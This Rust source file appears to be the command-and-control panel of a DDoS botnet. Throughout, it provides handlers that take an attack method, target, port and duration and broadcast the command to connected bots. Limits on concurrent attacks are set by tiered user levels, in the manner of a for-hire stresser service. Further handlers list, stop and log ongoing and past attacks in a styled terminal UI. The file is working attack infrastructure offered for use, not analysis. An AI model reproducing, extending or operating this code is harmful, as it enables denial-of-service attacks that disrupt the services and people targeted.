use std::sync::Arc;
use tokio::io::AsyncWriteExt;
use crate::modules::client_manager::Client;
use crate::modules::state::AppState;
use crate::modules::attack_manager::VALID_ATTACK_METHODS;
use crate::modules::error::{Result, AuditLog, log_audit_event};
use crate::modules::auth::Level;
use crate::modules::validation::{validate_port, validate_duration, check_ip_safety};
use super::ui::*;

pub async fn handle_attack_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    if parts.len() < 5 {
        client.write(b"\x1b[38;5;196m[X] Usage: attack <method> <target> <port> <duration>\n\r").await?;
        return Ok(());
    }

    let method_str = parts[1].to_uppercase();
    let target = parts[2].to_string();
    
    let port = match validate_port(parts[3]) {
        Ok(p) => p,
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] {}\n\r", e).as_bytes()).await?;
            return Ok(());
        }
    };
    
    let duration = match validate_duration(parts[4]) {
        Ok(d) => d,
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] {}\n\r", e).as_bytes()).await?;
            return Ok(());
        }
    };

    // Determine limits based on level
    let (max_time, concurrents) = match client.user.get_level() {
        Level::Owner => (state.config.max_attack_duration_secs * 2, 10),
        Level::Admin => (state.config.max_attack_duration_secs, 5),
        Level::Pro => (state.config.max_attack_duration_secs, 3),
        Level::Basic => (state.config.max_attack_duration_secs / 2, 1),
    };

    if duration > max_time {
        client.write(format!("\x1b[38;5;196m[X] Invalid duration (Max: {}s)\n\r", max_time).as_bytes()).await?;
        return Ok(());
    }

    // Check concurrent attacks limit
    let active_attacks = state.attack_manager.get_user_attacks(&client.user.username).await.len();
    if active_attacks >= concurrents {
        client.write(format!("\x1b[38;5;196m[X] Max concurrent attacks reached ({}/{})\n\r", active_attacks, concurrents).as_bytes()).await?;
        return Ok(());
    }

    // Validate method
    if !VALID_ATTACK_METHODS.contains(&method_str.as_str()) {
        client.write(b"\x1b[38;5;196m[X] Invalid attack method\n\r").await?;
        return Ok(());
    }

    // Parse IP or resolve domain
    let ip = match target.parse::<std::net::IpAddr>() {
        Ok(ip) => ip,
        Err(_) => {
            // Try to resolve domain
            match tokio::net::lookup_host(format!("{}:{}", target, port)).await {
                Ok(mut addrs) => {
                    if let Some(addr) = addrs.next() {
                        addr.ip()
                    } else {
                        client.write(b"\x1b[38;5;196m[X] Could not resolve domain\n\r").await?;
                        return Ok(());
                    }
                }
                Err(_) => {
                    client.write(b"\x1b[38;5;196m[X] Invalid IP address or domain\n\r").await?;
                    return Ok(());
                }
            }
        }
    };

    // Validate IP safety
    if let Err(e) = check_ip_safety(ip) {
        client.write(format!("\x1b[38;5;196m[X] {}\n\r", e).as_bytes()).await?;
        return Ok(());
    }

    let resolved_target = ip.to_string();
    let display_target = if target == resolved_target {
        target.clone()
    } else {
        format!("{} [{}]", target, resolved_target)
    };

    // Start attack
    let bot_count = state.bot_manager.get_bot_count().await;
    
    match state.attack_manager.start_attack(
        method_str.clone(),
        ip,
        port,
        duration,
        client.user.username.clone(),
        bot_count
    ).await {
        Ok(attack_id) => {
            // Send command to bots
            state.bot_manager.broadcast_attack(&method_str, &resolved_target, port, duration).await;

            // Log attack
            let audit_event = AuditLog::new(client.user.username.clone(), "START_ATTACK".to_string(), "SUCCESS".to_string())
                .with_target(format!("{}:{} (Method: {}, Duration: {}s, Bots: {})", display_target, port, method_str, duration, bot_count));
            let _ = log_audit_event(audit_event, &state.audit_file).await;

            // Send success message
            client.write(format!("\x1b[38;5;82m[✓] Attack sent to {} bots\n\rID: {}\n\rTarget: {}:{}\n\rMethod: {}\n\rDuration: {}s\n\r", 
                bot_count, attack_id, display_target, port, method_str, duration).as_bytes()).await?;
        }
        Err(e) => {
            client.write(format!("\x1b[38;5;196m[X] Failed to start attack: {}\n\r", e).as_bytes()).await?;
        }
    }

    Ok(())
}

pub async fn handle_ongoing_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let attacks = state.attack_manager.get_all_attacks().await;
    
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;
    
    // Top border
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    // Title
    let title = apply_ice_gradient("Ongoing Attacks");
    let title_text = format!("§ {} §", title);
    let title_padding = main_width - visible_len("§ Ongoing Attacks §") - 2;
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
    
    if attacks.is_empty() {
        let msg = "No ongoing attacks";
        let pad = main_width - visible_len(msg) - 2;
        client.write(format!("\x1b[38;5;240m║ \x1b[38;5;245m{}\x1b[38;5;240m{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", msg, " ".repeat(pad)).as_bytes()).await?;
    } else {
        for (i, attack) in attacks.iter().enumerate() {
            let remaining = attack.remaining_duration().as_secs();
            if remaining == 0 { continue; }
            
            let method_str = &attack.method;
            let target_str = format!("{}:{}", attack.ip, attack.port);
            
            let id_gradient = apply_gradient(&attack.id.to_string(), 39, 45);
            let user_gradient = apply_gradient(&attack.username, 45, 51);
            let target_gradient = apply_gradient(&target_str, 51, 57);
            let method_gradient = apply_gradient(method_str, 57, 63);
            let time_gradient = apply_gradient(&format!("{}s", remaining), 63, 87);
            
            let line_content = format!("  {} | {} | {} | {} | {}", 
                id_gradient, user_gradient, target_gradient, method_gradient, time_gradient);
                
            let visible = visible_len(&format!("  {} | {} | {} | {} | {}s", 
                attack.id, attack.username, target_str, method_str, remaining));
                
            let padding = if main_width > visible + 1 { main_width - visible - 1 } else { 0 };
            let right_panel = if i == 0 { "░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║" } else { "                              ║" };
            
            client.write(format!("\x1b[38;5;240m║{}{}\x1b[38;5;240m║{}\n\r", line_content, " ".repeat(padding), right_panel).as_bytes()).await?;
        }
    }
    
    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    client.set_breadcrumb("Home > Ongoing Attacks").await;
    Ok(())
}

pub async fn handle_stop_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
    let attack_id_str = match parts.get(1) {
        Some(id) => id.to_string(),
        None => {
            // Stop all attacks for user
            let attacks = state.attack_manager.get_user_attacks(&client.user.username).await;
            let mut count = 0;
            for attack in attacks {
                if state.attack_manager.stop_attack(attack.id).await.is_ok() {
                    state.bot_manager.broadcast_stop(attack.id).await;
                    count += 1;
                }
            }
            
            client.write(format!("\x1b[38;5;82m[✓] Stopped {} attacks\n\r", count).as_bytes()).await?;
            return Ok(());
        }
    };
    
    if let Ok(attack_id) = attack_id_str.parse::<usize>() {
        // Check ownership
        if let Some(attack) = state.attack_manager.get_attack(attack_id).await {
            if attack.username != client.user.username && !client.has_permission(Level::Admin) {
                 client.write(b"\x1b[38;5;196m[X] You do not own this attack\n\r").await?;
                 return Ok(());
            }
            
            if state.attack_manager.stop_attack(attack_id).await.is_ok() {
                state.bot_manager.broadcast_stop(attack_id).await;
                
                client.write(format!("\x1b[38;5;82m[✓] Attack {} stopped\n\r", attack_id).as_bytes()).await?;
                
                let audit_event = AuditLog::new(client.user.username.clone(), "STOP_ATTACK".to_string(), "SUCCESS".to_string())
                    .with_target(attack_id.to_string());
                let _ = log_audit_event(audit_event, &state.audit_file).await;
            } else {
                client.write(format!("\x1b[38;5;196m[X] Failed to stop attack {}\n\r", attack_id).as_bytes()).await?;
            }
        } else {
            client.write(format!("\x1b[38;5;196m[X] Attack {} not found\n\r", attack_id).as_bytes()).await?;
        }
    } else {
        client.write(b"\x1b[38;5;196m[X] Invalid attack ID\n\r").await?;
    }
    
    Ok(())
}

pub async fn handle_history_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let history = state.attack_manager.get_history(20).await;
    
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;
    
    // Top border
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    // Title
    let title = apply_ice_gradient("Attack History");
    let title_text = format!("§ {} §", title);
    let title_padding = main_width - visible_len("§ Attack History §") - 2;
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
    
    // Filter for user unless admin
    let user_history: Vec<_> = history.iter()
        .filter(|a| client.has_permission(Level::Admin) || a.username == client.user.username)
        .take(10)
        .collect();
        
    if user_history.is_empty() {
        let msg = "No attack history";
        let pad = main_width - visible_len(msg) - 2;
        client.write(format!("\x1b[38;5;240m║ \x1b[38;5;245m{}\x1b[38;5;240m{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", msg, " ".repeat(pad)).as_bytes()).await?;
    } else {
        for (i, attack) in user_history.iter().enumerate() {
            let method_str = &attack.method;
            let target_str = format!("{}:{}", attack.ip, attack.port);
            let time_str = &attack.started_at; // It's a string
            
            let user_gradient = apply_gradient(&attack.username, 39, 45);
            let target_gradient = apply_gradient(&target_str, 45, 51);
            let method_gradient = apply_gradient(method_str, 51, 57);
            let time_gradient = apply_gradient(&time_str[11..19], 57, 87); // Extract HH:MM:SS
            
            let line_content = format!("  {} | {} | {} | {}", 
                user_gradient, target_gradient, method_gradient, time_gradient);
                
            let visible = visible_len(&format!("  {} | {} | {} | {}", 
                attack.username, target_str, method_str, &time_str[11..19]));
                
            let padding = if main_width > visible + 1 { main_width - visible - 1 } else { 0 };
            let right_panel = if i == 0 { "░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║" } else { "                              ║" };
            
            client.write(format!("\x1b[38;5;240m║{}{}\x1b[38;5;240m║{}\n\r", line_content, " ".repeat(padding), right_panel).as_bytes()).await?;
        }
    }
    
    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    client.set_breadcrumb("Home > History").await;
    Ok(())
}

pub async fn handle_queue_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
    let queue_size = state.attack_manager.get_queue_size().await;
    
    client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
    let width = get_terminal_width();
    let side_width = 30;
    let main_width = width - side_width - 2;
    
    // Top border
    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    // Title
    let title = apply_ice_gradient("Attack Queue");
    let title_text = format!("§ {} §", title);
    let title_padding = main_width - visible_len("§ Attack Queue §") - 2;
    let left_pad = title_padding / 2;
    let right_pad = title_padding - left_pad;
    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╠{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(main_width - 1)).as_bytes()).await?;
    
    let msg = format!("Queue Size: {}", queue_size);
    let pad = main_width - visible_len(&msg) - 2;
    client.write(format!("\x1b[38;5;240m║ \x1b[38;5;245m{}\x1b[38;5;240m{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", msg, " ".repeat(pad)).as_bytes()).await?;
    
    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
    
    Ok(())
}


